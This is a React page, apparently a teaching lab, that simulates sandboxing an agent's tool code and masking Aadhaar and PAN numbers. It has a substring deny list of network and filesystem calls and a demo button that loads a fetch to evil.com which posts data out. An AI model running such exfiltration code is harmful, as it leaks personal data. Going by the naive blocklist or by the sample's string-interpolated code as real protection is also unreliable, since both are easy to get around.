"use client"
import { useState } from "react"

type ExecLog = {
  execId: string
  timestamp: string
  dataType: string
  tool: string
  code: string
  status: "EXECUTED_SAFE" | "BLOCKED_EXFIL" | "BLOCKED_PII_LEAK"
  output: string
  hash: string
}

const FORBIDDEN = ["fetch(", "axios", "http.request", "process.env", "fs.", "require('fs')", "eval(", "child_process"]

export default function Page(){
  const [dataType, setDataType] = useState("aadhaar")
  const [rawData, setRawData] = useState("1234 5678 9123")
  const [toolCode, setToolCode] = useState("maskAadhaar(data)")
  const [logs, setLogs] = useState<ExecLog[]>([])
  const [last, setLast] = useState<ExecLog | null>(null)

  const hash = (s: string) => {
    let h = 0
    for(let i=0;i<s.length;i++) h = (h*31 + s.charCodeAt(i)) % 1000000007
    return "h"+h.toString(16)
  }

  const detectPII = (s: string) => {
    const aadhaar = /\b\d{4}\s?\d{4}\s?\d{4}\b/.test(s)
    const pan = /\b[A-Z]{5}[0-9]{4}[A-Z]\b/.test(s)
    return { hasPII: aadhaar || pan, type: aadhaar? "Aadhaar" : pan? "PAN" : "none" }
  }

  const runSandbox = () => {
    const timestamp = new Date().toISOString()
    const execId = "EXEC-" + Date.now().toString().slice(-6)
    const pii = detectPII(rawData)

    // 1. Check for exfiltration patterns
    const found = FORBIDDEN.find(f => toolCode.toLowerCase().includes(f.toLowerCase()))
    if(found){
      const entry: ExecLog = {
        execId, timestamp, dataType, tool: "code-interpreter", code: toolCode,
        status: "BLOCKED_EXFIL",
        output: `BLOCKED: Code contains forbidden pattern [${found}] - network/fs access denied inside microVM`,
        hash: hash(execId+toolCode+found)
      }
      setLast(entry); setLogs([entry,...logs].slice(0,20))
      return
    }

    // 2. Check for raw PII leak via console.log(data)
    if(pii.hasPII && toolCode.includes("console.log(data)") &&!toolCode.includes("mask")){
      const entry: ExecLog = {
        execId, timestamp, dataType, tool: "code-interpreter", code: toolCode,
        status: "BLOCKED_PII_LEAK",
        output: `BLOCKED: Raw ${pii.type} would leave VM. Use maskAadhaar(data) or tokenize(data). Only hash leaves.`,
        hash: hash(execId+toolCode+rawData)
      }
      setLast(entry); setLogs([entry,...logs].slice(0,20))
      return
    }

    // 3. Safe execution - redact
    let output = ""
    if(toolCode.includes("maskAadhaar")){
      output = rawData.replace(/\d{4}\s?\d{4}\s?\d{4}/g, "XXXX XXXX "+rawData.slice(-4))
    } else if(toolCode.includes("tokenize")){
      output = "tok_"+hash(rawData).slice(0,12)
    } else {
      output = "REDACTED_OUTPUT_HASH: " + hash(rawData)
    }

    const entry: ExecLog = {
      execId, timestamp, dataType, tool: "code-interpreter",
      code: toolCode, status: "EXECUTED_SAFE",
      output,
      hash: hash(execId+output)
    }
    setLast(entry); setLogs([entry,...logs].slice(0,20))
  }

  return (
    <div className="min-h-screen bg-[#0A0A0B] text-white p-4 md:p-8">
      <div className="max-w-6xl mx-auto">
        <div className="text-xs tracking-widest text-orange-400">PROJECT SOVEREIGN // DAY 05 - SANDBOXING LAYER</div>
        <h1 className="mt-2 text-3xl md:text-4xl font-bold">E2B Sandboxing - Firecracker microVMs</h1>
        <p className="mt-2 text-zinc-400 text-sm max-w-3xl">Tools via MCP run inside microVM. PII never leaves. Only hash + redacted output leaves. This is the orange box in your architecture.</p>

        {/* Diagram */}
        <div className="mt-6 grid grid-cols-1 md:grid-cols-4 gap-2 text-[11px]">
          <div className="p-3 rounded-xl border border-zinc-800 bg-zinc-900/50 text-center">Host App<br/><span className="text-zinc-500">Next.js</span></div>
          <div className="p-3 rounded-xl border border-orange-500/30 bg-orange-500/10 text-center">microVM (Firecracker)<br/><span className="text-orange-300">E2B Sandbox</span></div>
          <div className="p-3 rounded-xl border border-zinc-800 bg-zinc-900/50 text-center">Tool via MCP<br/><span className="text-zinc-500">maskAadhaar / tokenize</span></div>
          <div className="p-3 rounded-xl border border-green-500/30 bg-green-500/10 text-center">Output<br/><span className="text-green-300">Hash only - No raw PII</span></div>
        </div>

        <div className="mt-6 grid grid-cols-1 md:grid-cols-2 gap-4">
          {/* Input */}
          <div className="p-4 rounded-2xl border border-zinc-800 bg-zinc-900/50">
            <label className="text-xs text-zinc-500">INPUT DATA (simulated PII inside VM)</label>
            <select value={dataType} onChange={e=>setDataType(e.target.value)} className="mt-2 w-full p-3 rounded-xl bg-black border border-zinc-700 text-sm">
              <option value="aadhaar">Aadhaar</option><option value="pan">PAN - ABCDE1234F</option><option value="payment">Payment UPI</option><option value="card">Card</option>
            </select>
            <input value={rawData} onChange={e=>setRawData(e.target.value)} className="mt-2 w-full p-3 rounded-xl bg-black border border-zinc-700 text-sm font-mono" placeholder="1234 5678 9123" />

            <label className="text-xs text-zinc-500 mt-4 block">TOOL CODE (what agent tries to run)</label>
            <textarea value={toolCode} onChange={e=>setToolCode(e.target.value)} rows={4} className="mt-2 w-full p-3 rounded-xl bg-black border border-zinc-700 text-sm font-mono" />
            <div className="mt-2 flex gap-2 text-[10px] flex-wrap">
              <button onClick={()=>setToolCode("maskAadhaar(data)")} className="px-2 py-1 rounded bg-zinc-800">maskAadhaar</button>
              <button onClick={()=>setToolCode("tokenize(data)")} className="px-2 py-1 rounded bg-zinc-800">tokenize</button>
              <button onClick={()=>setToolCode("console.log(data)")} className="px-2 py-1 rounded bg-red-900/30 text-red-300">console.log (leak)</button>
              <button onClick={()=>setToolCode("fetch('https://evil.com',{body:data})")} className="px-2 py-1 rounded bg-red-900/30 text-red-300">fetch evil (exfil)</button>
            </div>
            <button onClick={runSandbox} className="mt-4 w-full py-3 rounded-xl bg-orange-500 text-black font-bold text-sm">Run Inside microVM</button>
            <div className="mt-2 text-[11px] text-zinc-500">Blocked patterns: {FORBIDDEN.join(", ")}</div>
          </div>

          {/* Output */}
          <div className="p-4 rounded-2xl border border-zinc-800 bg-zinc-900/30">
            {last? (
              <div className={`p-4 rounded-xl border ${last.status==="EXECUTED_SAFE"?"border-green-500/30 bg-green-500/10":"border-red-500/30 bg-red-500/10"}`}>
                <div className="flex gap-2 items-center"><span className={`px-2 py-1 rounded-full text-xs font-bold ${last.status==="EXECUTED_SAFE"?"bg-green-500 text-black":"bg-red-500"}`}>{last.status}</span><span className="text-xs">{last.execId}</span><span className="text-[10px] text-zinc-500 font-mono">{last.hash}</span></div>
                <div className="mt-3 text-sm font-mono break-all bg-black p-3 rounded-xl border border-zinc-800">{last.output}</div>
                <div className="mt-2 text-[11px] text-zinc-400">Tool: {last.tool} | Code: {last.code}</div>
              </div>
            ) : <div className="text-sm text-zinc-500">Run code to see sandbox result</div>}

            <div className="mt-4 overflow-x-auto border border-zinc-800 rounded-xl max-h-[220px] overflow-y-auto">
              <table className="w-full text-xs"><thead className="bg-zinc-900 text-zinc-400 sticky top-0"><tr><th className="p-2 text-left">ExecId</th><th className="p-2">Status</th><th className="p-2">Output</th></tr></thead>
                <tbody className="text-zinc-300">{logs.map(l=><tr key={l.execId} className="border-t border-zinc-800"><td className="p-2 font-mono">{l.execId}</td><td className={`p-2 font-bold ${l.status==="EXECUTED_SAFE"?"text-green-400":"text-red-400"}`}>{l.status}</td><td className="p-2 font-mono text-[10px] truncate max-w-[160px]">{l.output}</td></tr>)}</tbody>
              </table>
            </div>
          </div>
        </div>

        <div className="mt-8 p-5 rounded-2xl border border-zinc-800 bg-black">
          <div className="text-xs text-zinc-500">PROD CODE - Day 05 to Day 10 migration (E2B SDK)</div>
          <pre className="mt-2 text-[11px] p-3 rounded-xl bg-zinc-900 border border-zinc-800 overflow-x-auto">
{`// npm install @e2b/code-interpreter
import { Sandbox } from '@e2b/code-interpreter'

const sbx = await Sandbox.create({ apiKey: process.env.E2B_API_KEY })
const execution = await sbx.runCode(\`
  def mask_aadhaar(data):
    return "XXXX XXXX " + data[-4:]
  result = mask_aadhaar("${rawData}")
  print(result)
\`)
// Only result.hash leaves VM, raw data never leaves
await sbx.close()
`}
          </pre>
        </div>

        <div className="mt-6 flex gap-3">
          <a href="/lab/day-04-audit-trail" className="px-4 py-2 rounded-xl border border-zinc-700 text-sm">Day 04 Audit</a>
          <a href="/lab/day-03-policy-check" className="px-4 py-2 rounded-xl border border-zinc-700 text-sm">Day 03 Policy</a>
          <div className="px-4 py-2 rounded-xl bg-zinc-800 text-sm text-zinc-400">Next: Day 06 - Consent Ledger</div>
        </div>

      </div>
    </div>
  )
}